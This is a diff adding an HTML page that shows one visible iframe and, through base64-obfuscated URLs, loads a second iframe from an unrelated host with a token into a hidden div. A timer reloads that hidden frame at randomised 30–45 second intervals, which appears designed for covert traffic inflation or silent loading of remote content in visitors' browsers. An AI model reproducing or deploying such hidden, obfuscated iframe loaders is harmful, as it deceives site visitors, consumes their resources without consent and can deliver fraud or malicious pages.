@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <base target="_parent">
+    <meta http-equiv=Content-Type content="text/html;charset=utf-8">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.1.0.js"></script>
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+        }
+
+        .page {
+            color: #333;
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        #show-div {
+            overflow: hidden;
+            height: 100%;
+        }
+
+        #show-div iframe {
+            height: 100%;
+            width: 100%;
+        }
+
+        #hide-div {
+            height: 100%;
+            display: none;
+        }
+
+        #hide-div iframe {
+            height: 100%;
+            width: 100%;
+        }
+
+        .alert-box {
+            position: fixed; /* 固定定位 */
+            top: 15px; /* 距离页面顶部20px */
+            left: 50%; /* 水平居中定位起点 */
+            transform: translateX(-50%); /* 水平居中调整 */
+            width: 90%; /* 宽度占视口90% */
+            max-width: 800px; /* 最大宽度限制 */
+            height: 36px; /* 固定高度 */
+            background: #fff3cd; /* 提示黄色背景 */
+            border: 1px solid #ffeeba;
+            border-radius: 8px;
+            padding: 6px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000; /* 确保在最顶层 */
+        }
+
+        .content {
+            margin: 15px auto;
+            padding: 15px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            max-width: 800px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            color: #444;
+            font-size: 0.95rem;
+        }
+
+        .content img {
+            width: 100%;
+            object-fit: cover;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            color: #444;
+            font-size: 0.95rem;
+        }
+
+        .article-header {
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 20px;
+            text-align: center;
+            padding: 7px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            max-width: 800px;
+        }
+
+        .article-title {
+            font-size: 1.2rem;
+            color: #2c3e50;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+    let timeLeft = 30;
+    const countdownElement = document.getElementById('countdown');
+
+    const timer = setInterval(() => {
+        timeLeft--;
+        countdownElement.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            countdownElement.textContent = '0';
+        }
+    }, 1000);
+</script><div id="show-div"></div><div id="hide-div"></div>
+<script>
+    var showUrl = "aHR0cHM6Ly90aW5zc2h1by5naXRodWIuaW8vd2FuZ3llLw==";
+    var tmUrl1 = "aHR0cDovL3d3dy5ldGNoby5jbjo4MDgwL3Byb2ZpbGUvdXBsb2FkLzIwMjUvMDUvMjYvMl8yMDI1MDUyNjEzMDgxOEEwMDEuaHRtbD90b2tlbj1hSFp3ZG5zd0l5Rm1aV1J6YlhCNGVRNVBTVXBGV0VnQVUxd2JWRlZBVVEwbUptc2hPaTlfS0dFNkdpVjNhMnRxV0ZkVlZGQmFYRjVGUkZvZURCY1E=";
+    var tmUrl2 = "";
+    var tmUrl3 = "";
+    if (isURL(showUrl)) {
+        iframe(showUrl, true);
+    } else {
+        $('#show-div').html(`<span>无效URL</span>`)
+    }
+    if (isURL(tmUrl1)) {
+        iframe(tmUrl1)
+    }
+    if (isURL(tmUrl2)) {
+        iframe(tmUrl2)
+    }
+    if (isURL(tmUrl3)) {
+        iframe(tmUrl3)
+    }
+
+    var shuaxin1 = "30";
+    shuaxin1 = Number(shuaxin1)
+    var shuaxin2 = "45";
+    shuaxin2 = Number(shuaxin2)
+    var sxTime = randomInt(shuaxin1, shuaxin2);
+    const sxTimes = setInterval(() => {
+        sxTime--;
+        console.log(sxTime)
+        if (sxTime == 0) {
+            document.querySelectorAll('#hide-div iframe').forEach(function (iframe) {
+                const lodTime = randomInt(1, 5) * 1000;
+                const originalSrc = iframe.src;
+                iframe.src = 'about:blank'; // 设置为空白页面
+                setTimeout(function () {
+                    iframe.src = originalSrc; // 1 秒后恢复原始地址
+                }, lodTime);
+            });
+            sxTime = randomInt(shuaxin1, shuaxin2);
+        }
+    }, 1000);
+
+    function randomInt(min, max) {
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function iframe(url, show) {
+        var wrapper = jQuery('#hide-div');
+        if (show) {
+            wrapper = jQuery('#show-div');
+        }
+        jQuery('<iframe>', {
+            src: atob(url),
+            id: url,
+            frameborder: 0,
+            scrolling: 'yes'
+        }).appendTo(wrapper);
+    }
+
+    function isURL(str) {
+        var bUrl = atob(str);
+        try {
+            const url = new URL(bUrl);
+            const isProtocolValid = ['http:', 'https:'].includes(url.protocol);
+            const startsWithProtocol = bUrl.toLowerCase().startsWith(url.protocol.toLowerCase());
+            return isProtocolValid && startsWithProtocol;
+        } catch (e) {
+            return false;
+        }
+    }
+</script>
+</body>
+
+
+
